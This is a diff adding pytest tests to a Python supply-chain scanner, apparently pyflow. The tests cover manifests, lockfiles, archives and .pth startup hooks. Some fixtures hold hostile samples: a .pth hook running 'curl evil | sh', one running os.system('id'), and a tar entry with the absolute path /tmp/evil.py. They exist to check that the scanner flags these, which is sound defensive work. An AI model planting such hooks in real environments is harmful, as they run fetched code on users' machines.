@@ -722,9 +722,11 @@ def test_direct_url_editable_install_is_reported(tmp_path):
         encoding="utf-8",
     )
     _write_record(dist_info, [dist_info / "METADATA", dist_info / "direct_url.json"])
-    kinds = {f.kind for f in scan_targets([tmp_path], recursive=True).findings}
-    assert {"editable-install", "local-path-requirement"} <= kinds
+    scan = scan_targets([tmp_path], recursive=True)
+    kinds = {f.kind for f in scan.findings}
+    assert {"editable-install", "installed-local-path"} <= kinds
     assert "unpinned-vcs-dependency" not in kinds
+    assert scan.metadata["inventoryComplete"] is True
 
 
 def test_uv_optional_variant_markers_filter_with_selected_extra(tmp_path):
@@ -784,6 +786,7 @@ def test_editable_requirement_marks_inventory_incomplete(tmp_path):
     scan = scan_targets([tmp_path / "requirements.txt"])
     assert not scan.metadata["inventoryComplete"]
     assert "editable-requirement" in scan.metadata["inventoryLimitations"]
+    assert all(f.severity == "MEDIUM" for f in scan.findings if f.kind == "editable-requirement")
 
 
 def test_valid_pep508_vcs_requirement_reports_unpinned_revision(tmp_path):
@@ -913,3 +916,427 @@ def test_sitecustomize_in_record_is_still_an_installed_hook(tmp_path):
         f.kind == "python-startup-hook" and f.severity == "HIGH"
         for f in scan_targets([site], recursive=True).findings
     )
+
+
+def test_record_listed_startup_hooks_are_classified(tmp_path):
+    site = tmp_path / "site-packages"
+    site.mkdir()
+    dist_info = _dist(site, "demo", "1.0")
+    (site / "custom.pth").write_text("import os\n", encoding="utf-8")
+    (site / "__editable__.demo-1.0.pth").write_text("/tmp/src\n", encoding="utf-8")
+    _write_record(
+        dist_info,
+        [
+            dist_info / "METADATA",
+            site / "custom.pth",
+            site / "__editable__.demo-1.0.pth",
+        ],
+    )
+    severities = {
+        Path(f.location).name: f.severity
+        for f in scan_targets([site], recursive=True).findings
+        if f.kind == "python-startup-hook"
+    }
+    assert severities["custom.pth"] == "MEDIUM"
+    assert severities["__editable__.demo-1.0.pth"] == "LOW"
+
+
+def test_editable_named_pth_with_arbitrary_code_is_high(tmp_path):
+    site = tmp_path / "site-packages"
+    site.mkdir()
+    dist_info = _dist(site, "demo", "1.0")
+    (site / "__editable__.evil.pth").write_text(
+        'import os; os.system("curl evil | sh")\n', encoding="utf-8"
+    )
+    _write_record(dist_info, [dist_info / "METADATA", site / "__editable__.evil.pth"])
+    findings = [
+        f for f in scan_targets([site], recursive=True).findings if f.kind == "python-startup-hook"
+    ]
+    assert len(findings) == 1
+    assert findings[0].severity == "HIGH"
+
+
+def test_known_installer_pth_is_low_but_arbitrary_pth_is_high(tmp_path):
+    known = tmp_path / "known-1.0-py3-none-any.whl"
+    with zipfile.ZipFile(known, "w") as archive:
+        archive.writestr("demo/__init__.py", "")
+        archive.writestr(
+            "distutils-precedence.pth",
+            'import os; var = "SETUPTOOLS_USE_DISTUTILS"; __import__("_distutils_hack")',
+        )
+        archive.writestr("demo-1.0.dist-info/METADATA", "Name: demo\nVersion: 1.0\n")
+        archive.writestr("demo-1.0.dist-info/RECORD", "")
+    known_findings = [f for f in scan_targets([known]).findings if f.kind == "archive-pth-file"]
+    assert known_findings[0].severity == "LOW"
+
+    arbitrary = tmp_path / "arbitrary-1.0-py3-none-any.whl"
+    with zipfile.ZipFile(arbitrary, "w") as archive:
+        archive.writestr("demo/__init__.py", "")
+        archive.writestr("hook.pth", 'import os; os.system("id")')
+        archive.writestr("demo-1.0.dist-info/METADATA", "Name: demo\nVersion: 1.0\n")
+        archive.writestr("demo-1.0.dist-info/RECORD", "")
+    arbitrary_findings = [
+        f for f in scan_targets([arbitrary]).findings if f.kind == "archive-pth-file"
+    ]
+    assert arbitrary_findings[0].severity == "HIGH"
+
+
+def test_docs_file_named_constraints_txt_is_not_a_manifest(tmp_path):
+    docs = tmp_path / "docs" / "ref"
+    docs.mkdir(parents=True)
+    (docs / "constraints.txt").write_text(
+        "Constraints reference\n=====================\n\nThe docs explain things.\n",
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path], recursive=True)
+    assert scan.components == ()
+    assert not any(f.kind == "invalid-requirement" for f in scan.findings)
+
+
+def test_requirements_file_with_only_bare_names_is_still_parsed(tmp_path):
+    (tmp_path / "requirements.txt").write_text("flask\nrequests\n", encoding="utf-8")
+    scan = scan_targets([tmp_path / "requirements.txt"])
+    assert {c["name"] for c in scan.components} == {"flask", "requests"}
+
+
+def test_unrendered_template_manifests_are_skipped_not_invalid(tmp_path):
+    templates = tmp_path / "templates"
+    templates.mkdir()
+    (templates / "pyproject.toml").write_text(
+        '[project]\nname = "{{ project_name }}"\ndependencies = ["{{ dep }}"]\n',
+        encoding="utf-8",
+    )
+    (templates / "requirements.txt").write_text("{{ dependency }}\n", encoding="utf-8")
+    scan = scan_targets([tmp_path], recursive=True)
+    assert scan.components == ()
+    assert not any(f.kind in {"invalid-pyproject", "invalid-requirement"} for f in scan.findings)
+    assert sum(f.kind == "template-manifest-skipped" for f in scan.findings) == 2
+
+
+def test_documentation_archive_fixture_is_not_high_severity(tmp_path):
+    docs = tmp_path / "docs"
+    docs.mkdir()
+    (docs / "project-import.zip").write_text("placeholder fixture\n", encoding="utf-8")
+    findings = [
+        f
+        for f in scan_targets([tmp_path], recursive=True).findings
+        if f.kind == "archive-unrecognized-format"
+    ]
+    assert findings and findings[0].severity == "LOW"
+
+
+def test_numeric_dash_data_file_is_not_sniffed_as_requirements(tmp_path):
+    data = tmp_path / "svmlight_invalid_order.txt"
+    data.write_text("-1 1:0.5 2:1.0\n-1 2:0.2\n", encoding="utf-8")
+    scan = scan_targets([data])
+    assert scan.components == ()
+    assert not any(f.kind == "unrecognized-requirement-option" for f in scan.findings)
+
+
+def test_test_fixture_archive_structural_findings_are_low_but_top_level_keeps_high(tmp_path):
+    import io
+    import tarfile
+
+    payload = io.BytesIO()
+    with tarfile.open(fileobj=payload, mode="w") as archive:
+        info = tarfile.TarInfo("/tmp/evil.py")
+        data = b"x"
+        info.size = 1
+        archive.addfile(info, io.BytesIO(data))
+    tests_dir = tmp_path / "tests"
+    tests_dir.mkdir()
+    fixture = tests_dir / "traversal.tar"
+    fixture.write_bytes(payload.getvalue())
+    fixture_scan = scan_targets([tmp_path], recursive=True)
+    fixture_findings = [f for f in fixture_scan.findings if f.kind == "archive-absolute-path"]
+    assert fixture_findings[0].severity == "LOW"
+
+    top = tmp_path / "top.tar"
+    top.write_bytes(payload.getvalue())
+    top_findings = [f for f in scan_targets([top]).findings if f.kind == "archive-absolute-path"]
+    assert top_findings[0].severity == "HIGH"
+
+
+def test_nested_test_fixture_archive_unrecognized_is_low(tmp_path):
+    import io
+    import tarfile
+
+    outer_payload = io.BytesIO()
+    with tarfile.open(fileobj=outer_payload, mode="w") as archive:
+        data = b"not really gzip\n"
+        info = tarfile.TarInfo("core.tar.gz")
+        info.size = len(data)
+        archive.addfile(info, io.BytesIO(data))
+    tests_dir = tmp_path / "tests"
+    tests_dir.mkdir()
+    (tests_dir / "backup.tar").write_bytes(outer_payload.getvalue())
+    findings = [
+        f
+        for f in scan_targets([tmp_path], recursive=True).findings
+        if f.kind == "archive-unrecognized-format"
+    ]
+    assert findings
+    assert all(f.severity == "LOW" for f in findings)
+
+
+def test_requirement_include_can_cross_subdirectories_inside_project(tmp_path):
+    (tmp_path / "pyproject.toml").write_text('[project]\nname="demo"\nversion="1"\n')
+    (tmp_path / "requirements.txt").write_text("flask==3.0.0\n", encoding="utf-8")
+    sub = tmp_path / ".github"
+    sub.mkdir()
+    (sub / "requirements-ci.txt").write_text("-r ../requirements.txt\n", encoding="utf-8")
+    scan = scan_targets([tmp_path], recursive=True)
+    assert any(c["name"] == "flask" for c in scan.components)
+    assert not any(f.kind == "external-requirement-include" for f in scan.findings)
+
+
+def test_requirement_include_outside_project_is_not_followed(tmp_path):
+    project = tmp_path / "project"
+    outside = tmp_path / "outside"
+    project.mkdir()
+    outside.mkdir()
+    (project / "pyproject.toml").write_text('[project]\nname="demo"\nversion="1"\n')
+    (outside / "evil.txt").write_text("requests==2.31.0\n", encoding="utf-8")
+    (project / "requirements.txt").write_text("-r ../outside/evil.txt\n", encoding="utf-8")
+    scan = scan_targets([project], recursive=True)
+    assert not any(c["name"] == "requests" for c in scan.components)
+    assert any(f.kind == "external-requirement-include" for f in scan.findings)
+    assert not scan.metadata["inventoryComplete"]
+
+
+def test_scripts_only_nested_manifest_is_not_a_package_inventory_failure(tmp_path):
+    scripts = tmp_path / "scripts"
+    scripts.mkdir()
+    (scripts / "requirements.txt").write_text("requests==2.31.0\n", encoding="utf-8")
+    scan = scan_targets([tmp_path])
+    finding = next(f for f in scan.findings if f.kind == "empty-supply-chain-inventory")
+    assert finding.severity == "MEDIUM"
+    assert finding.details["nested_manifests"] is True
+    assert finding.details["package_like"] is False
+
+
+def test_requirements_scope_uses_parent_directory_context(tmp_path):
+    tests = tmp_path / "tests" / "requirements"
+    tests.mkdir(parents=True)
+    (tests / "py3.txt").write_text("pytest==8.0.0\n", encoding="utf-8")
+    scan = scan_targets([tmp_path], recursive=True)
+    pytest_component = next(c for c in scan.components if c["name"] == "pytest")
+    assert {p["value"] for p in pytest_component["properties"] if p["name"] == "pyflow:scope"} == {
+        "test"
+    }
+    assert "# pytest==8.0.0" in build_requirements_text(scan)
+
+
+def test_explicit_symlinked_directory_target_is_scanned(tmp_path):
+    real = tmp_path / "real"
+    real.mkdir()
+    (real / "requirements.txt").write_text("flask==3.0.0\n", encoding="utf-8")
+    link = tmp_path / "link"
+    try:
+        link.symlink_to(real, target_is_directory=True)
+    except OSError:
+        pytest.skip("symlinks unavailable")
+    scan = scan_targets([link])
+    assert any(c["name"] == "flask" for c in scan.components)
+    assert any(f.kind == "filesystem-symlink" for f in scan.findings)
+
+
+def test_bare_unconventional_dependency_file_is_parsed(tmp_path):
+    (tmp_path / "deps.txt").write_text("flask\nrequests\n", encoding="utf-8")
+    scan = scan_targets([tmp_path / "deps.txt"])
+    assert {c["name"] for c in scan.components} == {"flask", "requests"}
+
+
+def test_sdist_looking_test_data_zip_is_not_a_package_archive(tmp_path):
+    data = tmp_path / "tests" / "data"
+    data.mkdir(parents=True)
+    with zipfile.ZipFile(data / "invoice-4.zip", "w") as archive:
+        archive.writestr("invoice.json", "{}")
+    assert not any(
+        f.kind == "archive-missing-package-metadata"
+        for f in scan_targets([tmp_path], recursive=True).findings
+    )
+
+
+def test_policy_optional_sections_and_expired_exception_severity(tmp_path):
+    from pyflow.checker.supply_chain import (
+        FindingPolicy,
+        SupplyChainFinding,
+        apply_finding_policy,
+        load_finding_policy,
+    )
+
+    exceptions_only = tmp_path / "exceptions.json"
+    exceptions_only.write_text(
+        json.dumps(
+            {
+                "exceptions": [
+                    {"kind": "unpinned-requirement", "expires": "2000-01-01", "reason": "old"}
+                ]
+            }
+        ),
+        encoding="utf-8",
+    )
+    policy = load_finding_policy(exceptions_only)
+    finding = SupplyChainFinding(
+        kind="unpinned-requirement", message="x", location="requirements.txt", severity="MEDIUM"
+    )
+    kept, suppressed = apply_finding_policy([finding], policy)
+    assert not suppressed
+    assert {f.kind: f.severity for f in kept}["policy-exception-expired"] == "HIGH"
+
+    baseline_only = tmp_path / "baseline-policy.json"
+    baseline_only.write_text(json.dumps({"baseline": ["abc"]}), encoding="utf-8")
+    loaded = load_finding_policy(baseline_only)
+    assert loaded.baseline_ids == frozenset({"abc"})
+    assert loaded.exceptions == ()
+
+
+def test_empty_commented_requirements_file_is_supported(tmp_path):
+    (tmp_path / "requirements.txt").write_text("# no deps\n\n", encoding="utf-8")
+    scan = scan_targets([tmp_path / "requirements.txt"])
+    assert scan.components == ()
+    assert not any(f.kind == "unsupported-supply-chain-target" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is True
+
+
+def test_uv_source_url_is_remote_and_fragment_hash_populates_component(tmp_path):
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname="demo"\nversion="1"\ndependencies=["foo"]\n'
+        "[tool.uv.sources]\n"
+        'foo={url="https://files.example.invalid/foo-1.0-py3-none-any.whl"}\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "pyproject.toml"])
+    assert scan.metadata["inventoryComplete"] is False
+    assert any(f.kind == "remote-requirement" for f in scan.findings)
+
+    digest = "a" * 64
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname="demo"\nversion="1"\ndependencies=["foo"]\n'
+        "[tool.uv.sources]\n"
+        f'foo={{url="https://files.example.invalid/foo-1.0-py3-none-any.whl#sha256={digest}"}}\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "pyproject.toml"])
+    foo = next(c for c in scan.components if c["name"] == "foo")
+    assert foo["hashes"] == [{"alg": "SHA-256", "content": digest}]
+    assert scan.metadata["inventoryComplete"] is True
+
+
+def test_lockfile_direct_url_is_preserved_and_mutable_url_is_incomplete(tmp_path):
+    (tmp_path / "uv.lock").write_text(
+        'version = 1\n[[package]]\nname = "foo"\nversion = "1.0"\n'
+        'source = { url = "https://files.example.invalid/foo-1.0-py3-none-any.whl" }\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "uv.lock"])
+    assert scan.metadata["inventoryComplete"] is False
+    foo = next(c for c in scan.components if c["name"] == "foo")
+    assert any(p["name"] == "pyflow:source-url" for p in foo["properties"])
+    assert "foo @ https://files.example.invalid" in build_requirements_text(scan)
+
+
+def test_rye_and_pdm_dev_dependencies_are_inventoried(tmp_path):
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname="demo"\nversion="1"\ndependencies=["requests"]\n'
+        '[tool.rye]\ndev-dependencies=["ruff==0.14.14"]\n'
+        '[tool.pdm.dev-dependencies]\ntest=["pytest==8.0.0"]\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "pyproject.toml"])
+    names = {c["name"] for c in scan.components}
+    assert {"ruff", "pytest"} <= names
+
+
+def test_hatch_environment_dependencies_are_inventoried(tmp_path):
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname="demo"\nversion="1"\ndependencies=["requests"]\n'
+        '[tool.hatch.envs.test]\ndependencies=["pytest==8.0.0"]\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "pyproject.toml"])
+    pytest_component = next(c for c in scan.components if c["name"] == "pytest")
+    assert "env:test" in {p["value"] for p in pytest_component["properties"]}
+
+
+def test_missing_metadata_version_marks_inventory_incomplete(tmp_path):
+    dist_info = tmp_path / "demo-1.0.dist-info"
+    dist_info.mkdir()
+    (dist_info / "METADATA").write_text("Name: demo\nLicense-Expression: MIT\n", encoding="utf-8")
+    (dist_info / "RECORD").write_text(
+        "demo-1.0.dist-info/METADATA,,\ndemo-1.0.dist-info/RECORD,,\n", encoding="utf-8"
+    )
+    scan = scan_targets([tmp_path], recursive=True)
+    assert any(f.kind == "metadata-missing-version" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is False
+
+
+def test_uv_workspace_member_is_not_the_application_and_keeps_local_source(tmp_path):
+    (tmp_path / "uv.lock").write_text(
+        "version = 1\n"
+        '[[package]]\nname = "root"\nversion = "1.0"\nsource = { virtual = "." }\n'
+        '[[package]]\nname = "member"\nversion = "0.1"\nsource = { editable = "../member" }\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "uv.lock"])
+    types = {c["name"]: c["type"] for c in scan.components}
+    assert types["root"] == "application"
+    assert types["member"] == "library"
+    member = next(c for c in scan.components if c["name"] == "member")
+    assert any(p["name"] == "pyflow:source-url" for p in member["properties"])
+    assert "member @ file://" in build_requirements_text(scan)
+    assert not any(f.kind == "license-not-declared" for f in audit_license_policy(scan))
+
+
+def test_missing_metadata_name_marks_inventory_incomplete(tmp_path):
+    dist_info = tmp_path / "demo-1.0.dist-info"
+    dist_info.mkdir()
+    (dist_info / "METADATA").write_text("Version: 1.0\n", encoding="utf-8")
+    (dist_info / "RECORD").write_text("", encoding="utf-8")
+    scan = scan_targets([dist_info], recursive=True)
+    assert any(f.kind == "metadata-missing-name" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is False
+
+
+def test_unresolved_setup_extras_marks_inventory_incomplete(tmp_path):
+    (tmp_path / "setup.py").write_text(
+        "from setuptools import setup\n"
+        'setup(name="demo", version="1.0", install_requires=[], extras_require=1)\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "setup.py"])
+    assert any(
+        f.kind == "unresolved-setup-requirements" and f.details["keyword"] == "extras_require"
+        for f in scan.findings
+    )
+    assert scan.metadata["inventoryComplete"] is False
+
+
+def test_invalid_pipfile_dependency_type_is_reported(tmp_path):
+    (tmp_path / "Pipfile").write_text("[packages]\nflask = 123\n", encoding="utf-8")
+    scan = scan_targets([tmp_path / "Pipfile"])
+    assert any(f.kind == "invalid-pipfile" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is False
+
+
+def test_pylock_local_directory_is_reported(tmp_path):
+    (tmp_path / "pylock.toml").write_text(
+        'lock-version = "1.0"\n[[packages]]\nname = "local"\n'
+        'directory = { path = "../local", editable = true }\n',
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "pylock.toml"])
+    assert any(f.kind == "local-path-requirement" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is False
+
+
+def test_pipfile_lock_local_path_is_incomplete_and_preserved(tmp_path):
+    (tmp_path / "Pipfile.lock").write_text(
+        json.dumps({"default": {"local": {"path": "./local", "editable": True}}}),
+        encoding="utf-8",
+    )
+    scan = scan_targets([tmp_path / "Pipfile.lock"])
+    assert any(f.kind == "local-path-requirement" for f in scan.findings)
+    assert scan.metadata["inventoryComplete"] is False
+    assert "local @ file://" in build_requirements_text(scan)
